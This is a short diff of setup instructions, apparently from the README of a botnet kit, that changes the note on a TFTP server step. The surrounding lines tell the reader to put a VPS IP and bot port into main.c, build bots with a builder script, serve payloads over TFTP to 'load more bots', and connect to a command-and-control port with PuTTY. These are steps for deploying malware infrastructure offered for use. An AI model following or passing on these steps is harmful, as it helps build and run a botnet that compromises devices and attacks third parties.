@@ -15,7 +15,7 @@
 # Bot steps
 - Edit main.c in /bot directory to your bot port and vps ip
 - sh legacybotbuilder.sh
-- sh tftpserver.sh  # start tftp server
+- sh tftpserver.sh  (Optional step but may help load more bots with bigger payload)
 
 # Connecting
 - Putty raw using vps ip + cnc port
